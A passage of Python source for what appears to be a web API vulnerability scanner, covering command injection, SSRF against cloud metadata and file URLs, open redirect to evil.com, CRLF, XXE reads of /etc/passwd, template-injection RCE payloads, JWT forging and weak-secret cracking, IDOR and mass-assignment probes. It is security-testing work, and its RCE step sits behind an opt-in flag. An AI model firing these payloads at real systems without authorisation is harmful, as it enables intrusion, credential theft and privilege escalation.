        ('& timeout /T 5',   5, '& timeout /T 0'),
        ('& timeout /T 5 &', 5, '& timeout /T 0 &'),
        ('; ping -c 5 127.0.0.1', 5, '; echo noop'),
        ('& ping -n 6 127.0.0.1', 5, '& ping -n 1 127.0.0.1'),
    ]

    @staticmethod
    def _injects(orig: str, suffix: str) -> List[str]:
        out: List[str] = []
        def add(s: str):
            if s and s not in out:
                out.append(s)
        add(suffix)
        o = (orig or "").strip()
        if o and len(o) <= 160 and suffix not in o:
            add(o + suffix)
        return out

    def _output_hit(self, text: str, patterns: List[str], baseline: str) -> Optional[str]:
        blob = text or ""
        base = baseline or ""
        for pat in patterns:
            if re.search(pat, blob, re.I) and not re.search(pat, base, re.I):
                return pat
        return None

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        orig = str(point.get("value") or "")
        base_txt = base_resp.text if base_resp else ""

        for suffix, patterns in self.OUTPUT_PAYLOADS:
            for pl in self._injects(orig, suffix):
                r = sender.send(point, pl)
                if not r:
                    continue
                pat = self._output_hit(r.text, patterns, base_txt)
                if pat:
                    return [Issue("CRITICAL", self.NAME, point['name'], pl,
                                  f"Command output: {pat}",
                                  sender.base.url, point['type'],
                                  response_snippet=r.text[:500])]

        bm = sender.baseline_median
        for suffix, delay, control_suffix in self.TIME_PAYLOADS:
            pl = self._injects(orig, suffix)[-1]
            control_pl = self._injects(orig, control_suffix)[-1]
            r, elapsed = sender.send_timed(point, pl)
            threshold = max(delay - CFG.TIME_THRESHOLD_MARGIN,
                            bm + delay * CFG.TIME_THRESHOLD_RATIO)
            if elapsed < threshold:
                continue
            r2, elapsed2 = sender.send_timed(point, pl)
            if elapsed2 < threshold:
                continue
            r3, elapsed3 = sender.send_timed(point, control_pl)
            if elapsed3 < bm * CFG.TIME_CONTROL_MAX_RATIO:
                return [Issue("CRITICAL", f"{self.NAME} (Time-Based)",
                              point['name'], pl,
                              f"Confirmed: {elapsed:.1f}s+{elapsed2:.1f}s  "
                              f"control={elapsed3:.1f}s  baseline={bm:.1f}s",
                              sender.base.url, point['type'])]
        return []


# ── SSRF (Multi-Cloud, Bypass Encodings, IMDSv2) ──────────────────────────
class SSRFScanner:
    KEY  = "ssrf"
    NAME = "SSRF"
    PAYLOADS = [
        # Cloud Metadata Services
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'https://metadata.goog/',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://100.100.100.200/latest/meta-data/',
        'http://169.254.169.254/opc/v1/instance/',
        'http://169.254.169.254/metadata/v1.json',
        'https://kubernetes.default.svc/',
        # Localhost & Loopback Bypasses
        'http://localhost/', 'http://127.0.0.1/', 'http://127.0.0.1:80/',
        'http://127.0.0.1:8080/', 'http://127.0.0.1:22/', 'http://[::1]/',
        'http://0.0.0.0/', 'http://127.1/', 'http://[::]/',
        'http://2130706433/',              # decimal IP (127.0.0.1)
        'http://0177.0.0.1/',              # octal IP
        'http://0x7f000001/',              # hex IP
        'http://[::ffff:127.0.0.1]/',      # IPv6 mapped
        # Internal RFC1918 Ranges
        'http://192.168.0.1/', 'http://10.0.0.1/', 'http://172.16.0.1/',
        'http://169.254.169.254@evil.com/',# credential confusion
        # Protocols
        'file:///etc/passwd', 'dict://localhost:11211/', 'gopher://localhost:6379/',
    ]
    INDICATORS = [
        r'ami\-id', r'instance\-id', r'local\-ipv4', r'public\-hostname',
        r'public\-ipv4', r'computeMetadata', r'project\-id',
        r'security\-credentials', r'AccessKeyId', r'instanceProfileArn',
        r'aws_access_key', r'aws_secret', r'ec2metadata',
        r'x\-aws\-ec2\-metadata\-token',
        r'169\.254\.169\.254', r'metadata\.google\.internal',
        r'root:x:0:0', r'root:.*:0:0:', r'/etc/passwd', r'/etc/shadow',
        r'subscriptionId', r'resourceGroupName', r'azEnvironment', r'vmId',
        r'compartmentId', r'displayName', r'droplet_id',
        r'Missing Metadata', r'Metadata header is required',
    ]
    _SLOW_URL = "http://10.255.255.254:80/"
    _CTRL_URL = "http://ssrf-nosuch-host-apiscan.invalid/"

    def _indicator_hit(self, text: str, baseline: str) -> Optional[str]:
        blob = text or ""
        base = baseline or ""
        for pat in self.INDICATORS:
            if re.search(pat, blob, re.I) and not re.search(pat, base, re.I):
                return pat
        return None

    def _is_imdsv2_challenge(self, r, pl: str) -> bool:
        if not r or "169.254.169.254" not in pl:
            return False
        hdrs_str = " ".join(f"{k}: {v}" for k, v in (r.headers or {}).items()).lower()
        body_str = (r.text or "")[:1000].lower()
        if "x-aws-ec2-metadata-token" in hdrs_str or "x-aws-ec2-metadata-token" in body_str:
            return True
        if r.status_code == 401 and ("ec2ws" in hdrs_str or "ec2 metadata" in body_str):
            return True
        return False

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        base_txt = base_resp.text if base_resp else ""
        for pl in self.PAYLOADS:
            r = sender.send(point, pl, allow_redirects=False)
            if r:
                if self._is_imdsv2_challenge(r, pl):
                    return [Issue("HIGH", self.NAME, point['name'], pl,
                                  "Internal cloud metadata service reached (AWS IMDSv2 token challenge observed)",
                                  sender.base.url, point['type'],
                                  response_snippet=r.text[:500])]
                pat = self._indicator_hit(r.text, base_txt)
                if pat:
                    return [Issue("HIGH", self.NAME, point['name'], pl,
                                  f"Internal resource: {pat}",
                                  sender.base.url, point['type'],
                                  response_snippet=r.text[:500])]
                if r.is_redirect or r.status_code in (301, 302):
                    r2 = sender.send(point, pl, allow_redirects=True)
                    if r2:
                        if self._is_imdsv2_challenge(r2, pl):
                            return [Issue("HIGH", self.NAME, point['name'], pl,
                                          "Internal cloud metadata service reached via redirect (AWS IMDSv2 token challenge)",
                                          sender.base.url, point['type'],
                                          response_snippet=r2.text[:500])]
                        pat = self._indicator_hit(r2.text, base_txt)
                        if pat:
                            return [Issue("HIGH", self.NAME, point['name'], pl,
                                          f"Internal resource (via redirect): {pat}",
                                          sender.base.url, point['type'],
                                          response_snippet=r2.text[:500])]

        # Blind SSRF: one slow connect + one fast NXDOMAIN.
        if sender._should_stop():
            return []
        bm = sender.baseline_median
        _, t_slow = sender.send_timed(point, self._SLOW_URL, allow_redirects=False)
        thresh = max(3.5, bm + 2.5)
        if t_slow < thresh:
            return []
        _, t_ctrl = sender.send_timed(point, self._CTRL_URL, allow_redirects=False)
        if t_ctrl < thresh * 0.5:
            return [Issue("HIGH", f"{self.NAME} (Time-Based / Blind)",
                          point['name'], self._SLOW_URL,
                          f"Blackhole fetch {t_slow:.1f}s vs NXDOMAIN control "
                          f"{t_ctrl:.1f}s (baseline {bm:.1f}s) — server appears "
                          f"to connect outbound",
                          sender.base.url, point['type'])]
        return []


# ── OPEN REDIRECT ─────────────────────────────────────────────────────────
class OpenRedirectScanner:
    KEY  = "redirect"
    NAME = "Open Redirect"
    _REDIRECT_STATUSES = (300, 301, 302, 303, 307, 308)
    PAYLOADS = [
        'https://evil.com',
        '//evil.com',
        '/\\evil.com',
        '\\/evil.com',
        'https://evil.com%2F@legitimate.com',
        '/%09/evil.com',
        'https:evil.com',
        '\\\\evil.com',
        'https://evil.com/..;/legitimate.com',
        'https://evil.com@legitimate.example',
        'https://legitimate.example@evil.com',
        '//evil.com/%2f..',
        '////evil.com',
        '/\\/evil.com',
        'https://evil%2ecom',
        'https://evil。com',
        'javascript:alert(1)',
        'https://evil.com?target.com',
        'https://evil.com#target.com',
    ]

    @staticmethod
    def _redirect_target(headers) -> str:
        loc = headers.get('Location') or headers.get('location') or ''
        refresh = headers.get('Refresh') or headers.get('refresh') or ''
        rm = re.search(r'url\s*=\s*([^\s;]+)', refresh, re.I)
        return loc or (rm.group(1).strip('\'"') if rm else refresh)

    @classmethod
    def _is_evil_target(cls, target: str) -> bool:
        raw = (target or '').strip()
        if not raw:
            return False
        decoded = urllib.parse.unquote(raw)
        blob = f"{raw}\n{decoded}".lower()
        if 'javascript:' in blob:
            return True
        if 'evil.com' in blob or 'evil。com' in raw or 'evil。com' in decoded:
            return True
        return False

    @staticmethod
    def _body_redirect(text: str) -> Optional[str]:
        if not text:
            return None
        # Meta refresh tag: <meta http-equiv="refresh" content="0; url=https://evil.com">
        m = re.search(r'<meta[^>]+http-equiv=[\'"]?refresh[\'"]?[^>]+content=[\'"][^>]*url=([^"\'\s>]+)', text, re.I)
        if m and ('evil.com' in m.group(1).lower() or 'evil。com' in m.group(1)):
            return f"Meta refresh: {m.group(1)}"
        # Client-side JS redirect
        js_m = re.search(r'(?:window\.)?location(?:\.href)?\s*=\s*[\'"](?:https?:)?//(evil\.com[^"\']*)', text, re.I)
        if js_m:
            return f"JavaScript redirect: {js_m.group(0)}"
        return None

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        for pl in self.PAYLOADS:
            r = sender.send(point, pl, allow_redirects=False)
            if not r:
                continue
            target = self._redirect_target(r.headers)
            if self._is_evil_target(target):
                if r.status_code in self._REDIRECT_STATUSES or r.headers.get('Refresh'):
                    return [Issue("MEDIUM", self.NAME, point['name'], pl,
                                  f"Redirect via header: {target}",
                                  sender.base.url, point['type'],
                                  response_snippet=f"HTTP {r.status_code}\nLocation: {target}")]
            # Check client-side HTML / JS redirect
            body_ev = self._body_redirect(r.text)
            if body_ev:
                return [Issue("MEDIUM", f"{self.NAME} (DOM / Client-Side)",
                              point['name'], pl,
                              f"Redirect via response body: {body_ev}",
                              sender.base.url, point['type'],
                              response_snippet=r.text[:500])]
        return []


# ── CRLF / HEADER INJECTION ──────────────────────────────────────────────
class CRLFScanner:
    KEY  = "crlf"
    NAME = "CRLF / Header Injection"
    _MARKER_HOST = "crlf.evil.example"
    PAYLOADS = [
        '\r\nX-Injected: pwned',
        '\nX-Injected: pwned',
        '%0d%0aX-Injected:%20pwned',
        '%0aX-Injected:%20pwned',
        '\r\nSet-Cookie: injected=1',
        '%0d%0aSet-Cookie:%20injected=1',
        '%0d%0aLocation:%20https://crlf.evil.example/',
        '%0d%0aRefresh:%200;url=https://crlf.evil.example/',
        '%E5%98%8A%E5%98%8DX-Injected:%20pwned',
        '\r\n\tX-Injected: pwned',
        '%0d%0a%20X-Injected:%20pwned',
        '%0d%0aX-XSS-Protection:%200',
    ]

    def _payloads_for(self, point: Dict) -> List[str]:
        # requests/urllib3 strip raw CR/LF in header values — encoded only there.
        if point.get('type') == 'header':
            return [p for p in self.PAYLOADS if '\r' not in p and '\n' not in p]
        return list(self.PAYLOADS)

    @classmethod
    def _header_injected(cls, r) -> Optional[str]:
        if r is None:
            return None
        for k, v in r.headers.items():
            kl, vl = k.lower(), (v or '')
            if kl == 'x-injected' or 'x-injected' in kl:
                return f"header {k}"
            if 'pwned' in vl.lower():
                return f"header {k} value"
            if cls._MARKER_HOST in vl.lower():
                return f"header {k}→{vl[:80]}"
            if kl == 'set-cookie' and 'injected=1' in vl:
                return "Set-Cookie"
        loc = r.headers.get('Location', '')
        if cls._MARKER_HOST in loc.lower():
            return f"Location: {loc[:80]}"
        body = r.text or ""
        if re.search(r'HTTP/1\.[01]\s+\d{3}[\s\S]{0,300}X-Injected', body[:800], re.I):
            return "split status-line in body"
        return None

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        for pl in self._payloads_for(point):
            r = sender.send(point, pl)
            ev = self._header_injected(r)
            if ev:
                return [Issue("MEDIUM", self.NAME, point['name'], pl,
                              f"Injected header in response ({ev})",
                              sender.base.url, point['type'])]
        return []


# ── XXE (XML External Entity) ────────────────────────────────────────────
class XXEScanner:
    KEY  = "xxe"
    NAME = "XXE (XML External Entity)"
    PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    ]
    INDICATORS = [
        r'root:x:0:0', r'root:.*:0:0:', r'\[extensions\]', r'\[boot loader\]',
        r'ami-id', r'cm9vdDp',
    ]
    _ENTITY_URIS = (
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "http://169.254.169.254/latest/meta-data/",
    )

    @staticmethod
    def _looks_xml(body: str) -> bool:
        return (body or "").lstrip().lstrip("\ufeff").startswith("<")

    @staticmethod
    def _has_doctype(body: str) -> bool:
        return bool(re.search(r'<!DOCTYPE\b', body or "", re.I))

    @staticmethod
    def _insert_dtd(xml: str, dtd: str) -> str:
        m = re.match(r'^(\s*(?:\ufeff)?)(<\?xml\b[^?]*\?>)', xml, re.I | re.S)
        if m:
            return xml[:m.end()] + dtd + xml[m.end():]
        m2 = re.match(r'^(\s*(?:\ufeff)?)', xml)
        return (xml[:m2.end()] + dtd + xml[m2.end():]) if m2 else (dtd + xml)

    @staticmethod
    def _plant_entity_ref(xml: str, ref: str = "&xxe;") -> str:
        m = _XML_LEAF_RE.search(xml)
        if m:
            return xml[:m.start(2)] + ref + xml[m.end(2):]
        m2 = re.search(r'</[^>!?][^>]*>\s*$', xml)
        if m2:
            return xml[:m2.start()] + f"<xxeprobe>{ref}</xxeprobe>" + xml[m2.start():]
        return xml + f"<xxeprobe>{ref}</xxeprobe>"

    def _wrapped_payloads(self, original: str) -> List[str]:
        if not self._looks_xml(original) or self._has_doctype(original):
            return []
        out: List[str] = []
        for uri in self._ENTITY_URIS:
            dtd = f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{uri}">]>'
            out.append(self._plant_entity_ref(self._insert_dtd(original, dtd)))
        return out

    def _hit(self, r) -> Optional[str]:
        if not r:
            return None
        for pat in self.INDICATORS:
            if re.search(pat, r.text or ""):
                return pat
        return None

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        payloads: List[str] = []
        if point.get("type") == "body_raw":
            payloads.extend(self._wrapped_payloads(sender.base.body or ""))
        payloads.extend(self.PAYLOADS)

        seen: Set[str] = set()
        for pl in payloads:
            if pl in seen:
                continue
            seen.add(pl)
            r = sender.send(point, pl)
            pat = self._hit(r)
            if pat:
                kind = "wrapped original XML" if pl not in self.PAYLOADS else "stub document"
                return [Issue("HIGH", self.NAME, point['name'],
                              "[XXE Payload]",
                              f"Sensitive content: {pat} ({kind})",
                              sender.base.url, point['type'],
                              response_snippet=(r.text or "")[:500])]
        return []


# ── SSTI (Server-Side Template Injection) ─────────────────────────────────
class SSTIScanner:
    KEY  = "ssti"
    NAME = "Server-Side Template Injection"
    # High-entropy products to prevent digit collisions
    DETECT_PAYLOADS = [
        ('{{49382*18273}}',       '902347286'),   # Jinja2 / Twig
        ('${49382*18273}',        '902347286'),   # Java EL / MVEL / Freemarker
        ('<%= 49382*18273 %>',    '902347286'),   # ERB / EJS
        ('#{49382*18273}',        '902347286'),   # Ruby / SpEL
        ('%{49382*18273}',        '902347286'),   # OGNL
        ('*{49382*18273}',        '902347286'),   # Spring EL
        ('${{49382*18273}}',      '902347286'),
        ('{49382*18273}',         '902347286'),   # Smarty
        ('#set($x=49382*18273)$x','902347286'),   # Velocity
        ("{{7*'7'}}",             '7777777'),     # Jinja2 fingerprint
        ('{{1337*1337}}',         '1787569'),
        ('${1337*1337}',          '1787569'),
    ]
    RCE_PAYLOADS = [
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
         [r'uid=\d+'], "Jinja2 RCE"),
        ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
         [r'uid=\d+'], "Twig RCE"),
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
         [r'uid=\d+'], "Freemarker RCE"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}",
         [r'Process', r'UNIXProcess'], "Java EL RCE"),
    ]

    @staticmethod
    def _standalone(text: str, token: str) -> bool:
        if not text or not token:
            return False
        return bool(re.search(
            r'(?<![0-9A-Za-z_])' + re.escape(token) + r'(?![0-9A-Za-z_])',
            text))

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        detected_engine = None
        base_txt = base_resp.text if base_resp else ""
        for pl, expected in self.DETECT_PAYLOADS:
            r = sender.send(point, pl)
            if not r:
                continue
            if not self._standalone(r.text or "", expected):
                continue
            if self._standalone(base_txt, expected):
                continue
            if "7*'7'" in pl and expected == '7777777':
                detected_engine = 'Jinja2'
            return [Issue("CRITICAL", self.NAME, point['name'], pl,
                          f"Template evaluated: {pl} → {expected}"
                          + (f" (engine: {detected_engine})" if detected_engine else ""),
                          sender.base.url, point['type'],
                          response_snippet=r.text[:500])]

        # RCE confirmation phase (only if detection payloads didn't trigger,
        # AND only when explicitly allowed — these payloads execute real commands
        # like os.popen('id') on the target, which is unsafe to fire blindly)
        if not _ALLOW_RCE:
            return []
        for pl, patterns, desc in self.RCE_PAYLOADS:
            r = sender.send(point, pl)
            if r:
                for pat in patterns:
                    if re.search(pat, r.text, re.I):
                        return [Issue("CRITICAL", f"{self.NAME} ({desc})",
                                      point['name'], pl[:60],
                                      f"RCE confirmed: {pat}",
                                      sender.base.url, point['type'],
                                      response_snippet=r.text[:500])]
        return []


# ── IDOR (IMP-07: UUID + string + JSON key comparison) ────────────────────
class IDORScanner:
    KEY  = "idor"
    # Heuristic only — real BOLA confirmation belongs in the IDOR Tester (dual-token).
    NAME = "Possible IDOR (heuristic)"
    _LIST_KEYS = ("data", "items", "results", "content", "records", "rows", "list")

    def _json_keys(self, text):
        """Extract JSON key set for structural comparison (IMP-07)."""
        try:
            data = json.loads(text)
            if isinstance(data, dict): return set(data.keys())
            if isinstance(data, list) and data and isinstance(data[0], dict):
                return set(data[0].keys())
        except Exception: pass
        return set()

    def _looks_like_catalog(self, text: str) -> bool:
        """List/catalog endpoints return similar shapes for any ID — not BOLA proof."""
        try:
            data = json.loads(text)
        except Exception:
            return False
        if isinstance(data, list) and len(data) >= 3:
            return True
        if isinstance(data, dict):
            for k in self._LIST_KEYS:
                v = data.get(k)
                if isinstance(v, list) and len(v) >= 3:
                    return True
        return False

    def _swap_uuid(self, u):
        """IMP-07: Swap last UUID section to get different but valid UUID."""
        parts = u.split('-')
        if len(parts) != 5: return None
        last_int = int(parts[-1], 16)
        parts[-1] = format((last_int + 1) % (16**len(parts[-1])), f'0{len(parts[-1])}x')
        return '-'.join(parts)

    def _nonsense_probe(self, val: str) -> str:
        if _is_uuid(val):
            return "00000000-0000-4000-8000-000000000099"
        try:
            int(float(val))
            return "999999991"
        except (ValueError, TypeError):
            return "idor_public_probe_zz99"

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if not base_resp or base_resp.status_code != 200: return []
        pname = str(point.get('name') or '')
        if _IDOR_NOISY_PARAM.search(pname):
            return []  # pagination / search — never IDOR
        base_len = len(base_resp.text)
        if base_len < 20: return []
        if self._looks_like_catalog(base_resp.text):
            return []

        val = str(point['value'])
        probes = []

        # Numeric IDOR
        try:
            n = int(float(val))
            probes = [str(p) for p in [n+1, n-1, n+100, 1, 0, -1, 999999] if p != n]
        except (ValueError, TypeError):
            pass

        # UUID IDOR (IMP-07)
        if _is_uuid(val):
            swapped = self._swap_uuid(val)
            if swapped: probes = [swapped]

        if not probes: return []

        base_keys = self._json_keys(base_resp.text)

        for probe in probes:
            r = sender.send(point, probe)
            if not r or r.status_code != 200: continue
            if len(r.text) < 50: continue
            if self._looks_like_catalog(r.text):
                continue

            candidate = False
            evidence = ""
            # IMP-07: Use JSON key comparison (more robust than byte length)
            if base_keys:
                probe_keys = self._json_keys(r.text)
                if probe_keys and probe_keys == base_keys and r.text != base_resp.text:
                    candidate = True
                    evidence = (
                        f"ID {val}→{probe}: same JSON structure, different data "
                        f"({len(r.text)}B vs {base_len}B) — confirm with IDOR Tester (2 tokens)"
                    )
            else:
                # Fallback: byte-length ratio (weaker — still heuristic)
                size_ratio = abs(len(r.text) - base_len) / max(base_len, 1)
                if size_ratio < 0.25 and r.text != base_resp.text:
                    candidate = True
                    evidence = (
                        f"ID {val}→{probe}: both 200 OK "
                        f"({len(r.text)}B vs {base_len}B) — confirm with IDOR Tester (2 tokens)"
                    )

            if not candidate:
                continue

            # Public / unauthenticated catalog demotion: nonsense ID still same shape → FP
            nonsense = self._nonsense_probe(val)
            if nonsense != probe:
                rn = sender.send(point, nonsense)
                if rn and rn.status_code == 200 and len(rn.text) >= 50:
                    if base_keys:
                        nk = self._json_keys(rn.text)
                        if nk and nk == base_keys:
                            continue  # not access-controlled
                    else:
                        nr = abs(len(rn.text) - base_len) / max(base_len, 1)
                        if nr < 0.25:
                            continue

            return [Issue("MEDIUM", self.NAME, point['name'], probe,
                          evidence, sender.base.url, point['type'],
                          response_snippet=r.text[:500])]
        return []


# ── JWT (Weak Secrets, Algorithm Confusion & None Alg) ────────────────────
class JWTScanner:
    KEY  = "jwt"
    NAME = "JWT Vulnerability"
    _WEAK_SECRETS = [
        'secret', 'password', '123456', 'jwt_secret', 'change_this',
        'your-256-bit-secret', '', 'admin', 'key', 'supersecret', 'mysecret',
        'test', 'development', 'jwt', 'secret123', 'app', 'api', 'auth',
        'access', 'token', '12345678', '123456789', 'secretkey', 'default',
        'root', 'master', 'private', 'server', 'public', 'production',
        'company', 'security', 'secret_key', 'jwt-secret', 'pass123', 'user',
        'administrator', 'qwerty', 'welcome', 'testing', 'letmein',
    ]

    def _b64d(self, s):
        pad = s + '=' * (-len(s) % 4)
        try: return json.loads(base64.urlsafe_b64decode(pad).decode('utf-8', errors='ignore'))
        except Exception: return {}

    def _forge(self, header, payload, signature=""):
        h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).decode().rstrip('=')
        p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).decode().rstrip('=')
        return f"{h}.{p}.{signature}"

    _PEM_RE = re.compile(
        r'-----BEGIN (?:RSA )?(?:PUBLIC KEY|CERTIFICATE)-----[\s\S]+?'
        r'-----END (?:RSA )?(?:PUBLIC KEY|CERTIFICATE)-----')

    def _extract_pem_keys(self, *texts) -> List[str]:
        keys = []
        for t in texts:
            if not t: continue
            for m in self._PEM_RE.findall(t):
                key = m.strip()
                if key not in keys:
                    keys.append(key)
        return keys

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        jwt_token = None
        header_name = None

        val = str(point.get('value', ''))
        val_clean = re.sub(r'^Bearer\s+', '', val, flags=re.I).strip()
        if len(val_clean.split('.')) == 3 and val_clean.startswith('eyJ'):
            jwt_token = val_clean
            header_name = point.get('name', 'Authorization')

        if not jwt_token:
            for hname, hval in sender.base.headers.items():
                if hname.lower() == 'authorization':
                    clean = re.sub(r'^Bearer\s+', '', hval, flags=re.I).strip()
                    if len(clean.split('.')) == 3 and clean.startswith('eyJ'):
                        jwt_token = clean
                        header_name = hname
                        break

        if not jwt_token: return []

        parts = jwt_token.split('.')
        if len(parts) != 3: return []
        hdr  = self._b64d(parts[0])
        data = self._b64d(parts[1])
        if not hdr.get('alg'): return []

        is_bearer = val.lower().startswith('bearer ')
        prefix = "Bearer " if is_bearer else ""

        # ── alg:none ─────────────────────────────────────────
        for alg_none in ['none', 'None', 'NONE', 'nOnE']:
            forged = self._forge({**hdr, 'alg': alg_none}, data)
            headers = sender.base.headers.copy()
            headers[header_name] = prefix + forged
            r = sender.send_raw(headers=headers)
            if r and base_resp and r.status_code == base_resp.status_code < 400:
                return [Issue("CRITICAL", f"{self.NAME} (alg:none)",
                              header_name, f"alg={alg_none}",
                              f"Server accepted unsigned JWT (HTTP {r.status_code})",
                              sender.base.url, "header")]

        # ── Weak HMAC secrets ────────────────────────────────
        msg = f"{parts[0]}.{parts[1]}".encode()
        for secret in self._WEAK_SECRETS:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), msg, digestmod=hashlib.sha256).digest()
            ).decode().rstrip('=')
            if sig == parts[2]:
                return [Issue("CRITICAL", f"{self.NAME} (Weak Secret)",
                              header_name, f"secret={secret!r}",
                              f"JWT signed with guessable secret '{secret}'",
                              sender.base.url, "header")]

        # ── RS256→HS256 confusion ────────────────────────────
        if hdr.get('alg', '').upper() in ('RS256', 'RS384', 'RS512', 'ES256', 'ES384'):
            pem_keys = self._extract_pem_keys(base_resp.text if base_resp else None)
            candidates = ['', 'secret', 'your-256-bit-secret'] + pem_keys \
                + [k.replace('\n', '\\n') for k in pem_keys]
            for secret in candidates:
                confused_hdr = {**hdr, 'alg': 'HS256'}
                h_enc = base64.urlsafe_b64encode(
                    json.dumps(confused_hdr, separators=(',',':')).encode()
                ).decode().rstrip('=')
                p_enc = parts[1]
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), f"{h_enc}.{p_enc}".encode(),
                             digestmod=hashlib.sha256).digest()
                ).decode().rstrip('=')
                forged = f"{h_enc}.{p_enc}.{sig}"
                headers = sender.base.headers.copy()
                headers[header_name] = prefix + forged
                r = sender.send_raw(headers=headers)
                if r and base_resp and r.status_code == base_resp.status_code < 400:
                    secret_desc = (f"<extracted PEM public key, {len(secret)}B>"
                                   if secret in pem_keys or secret in
                                   [k.replace('\n', '\\n') for k in pem_keys]
                                   else repr(secret))
                    return [Issue("CRITICAL",
                                  f"{self.NAME} (RS256→HS256 Confusion)",
                                  header_name, f"alg=HS256 secret={secret_desc}",
                                  f"Server accepted algorithm confusion (HTTP {r.status_code})",
                                  sender.base.url, "header")]
        return []


# ── MASS ASSIGNMENT ───────────────────────────────────────────────────────
class MassAssignmentScanner:
    KEY  = "massassign"
    NAME = "Mass Assignment"
    MAX_ISSUES = 6
    _WRITABLE = {"POST", "PUT", "PATCH"}

    # Comprehensive canary injection bundles
    INJECT_BUNDLES = [
        {"isAdmin": True, "is_admin": True, "admin": True,
         "superuser": True, "isSuperuser": True, "is_superuser": True,
         "isRoot": True, "is_root": True},
        {"role": "MASSASSIGN_ADMIN", "userType": "MASSASSIGN_ADMIN",
         "user_type": "MASSASSIGN_ADMIN", "roles": ["MASSASSIGN_ADMIN"],
         "groups": ["MASSASSIGN_ADMIN"], "privilege": "MASSASSIGN_ADMIN",
         "accountType": "MASSASSIGN_PREMIUM", "tier": "enterprise", "plan": "enterprise"},
        {"isOwner": True, "is_owner": True, "owner": True,
         "canImpersonate": True, "impersonate": True,
         "tenantId": "1", "tenant_id": "1", "organizationId": "1"},
        {"credits": 999991, "balance": 999991, "creditLimit": 999991,
         "accessLevel": 99, "access_level": 99, "wallet_balance": 999991},
        {"verified": True, "isVerified": True, "emailVerified": True,
         "permissions": ["*"], "scopes": ["admin", "root"], "internal": True,
         "status": "active", "state": "approved", "approved": True,
         "price": 0, "discount": 100},
    ]
    INJECT_FIELDS = [
        {k: v} for bundle in INJECT_BUNDLES for k, v in bundle.items()
    ]
    _COMBINED_CANARY = {
        "isAdmin": True,
        "role": "MASSASSIGN_ADMIN",
        "credits": 999991,
        "isOwner": True,
        "canImpersonate": True,
    }
    _PRIV_NORM = {
        "isadmin", "is_admin", "admin", "superuser", "issuperuser", "is_superuser",
        "isroot", "is_root", "role", "roles", "usertype", "user_type",
        "privilege", "privileges", "accesslevel", "access_level",
        "isowner", "is_owner", "owner", "credits", "balance", "creditlimit",
        "credit_limit", "verified", "isverified", "emailverified",
        "canimpersonate", "impersonate", "permissions", "scopes",
        "accounttype", "account_type", "internal", "groups",
    }
    _ELEVATION_KEYS = {
        "isadmin", "is_admin", "admin", "superuser", "issuperuser", "is_superuser",
        "isroot", "is_root", "role", "roles", "privilege", "accesslevel",
        "access_level", "isowner", "is_owner", "canimpersonate",
    }
    _VOLATILE_NORM = {
        "timestamp", "time", "date", "createdat", "updatedat", "modifiedat",
        "lastmodified", "requestid", "reqid", "traceid", "correlationid",
        "csrf", "csrftoken", "nonce", "etag", "expires", "servertime",
        "currenttime", "generatedat", "responsetime",
    }
    _READONLY_META = {
        "id", "uuid", "guid", "href", "url", "_links", "links", "etag", "version",
        "createdat", "created_at", "updatedat", "updated_at", "modifiedat",
        "message", "success", "error", "errors", "statuscode", "httpstatus",
        "timestamp", "requestid", "traceid", "path", "method", "code", "status",
        "data", "result", "payload", "content",
    }
    _OMIT_KEY_RE = re.compile(
        r'^(e[_-]?mail|user[_-]?name|login|object[_-]?name|display[_-]?name|'
        r'phone|mobile|phone[_-]?number|slug)$',
        re.I,
    )
    _ELEVATED_ROLE_RE = re.compile(
        r'^(admin|administrator|superadmin|superuser|root|owner|'
        r'massassign_admin|massassign_premium)$',
        re.I,
    )
    _ENVELOPE_KEYS = ("data", "result", "payload", "body", "content", "item", "record")
    _MISSING = object()
    _SKIP_MUTATE_KEYS = {
        "password", "passwd", "secret",
        "token", "accesstoken", "refreshtoken", "authorization", "jwt",
    }
    _EXPECTED_WRITABLE = {
        "name", "title", "description", "desc", "label", "text", "comment",
        "icon", "color", "theme", "note", "notes", "summary", "display",
    }
    _SENSITIVE_EXACT = {
        "id", "uuid", "guid", "deleted", "isdeleted", "is_deleted", "archived",
        "hidden", "locked", "enabled", "disabled", "active", "status",
        "role", "roles", "permission", "permissions", "privilege",
        "admin", "isadmin", "is_admin", "owner", "isowner", "is_owner",
        "creator", "createdby", "created_by", "lastmodifier", "modifier",
        "username", "user_name", "userid", "user_id",
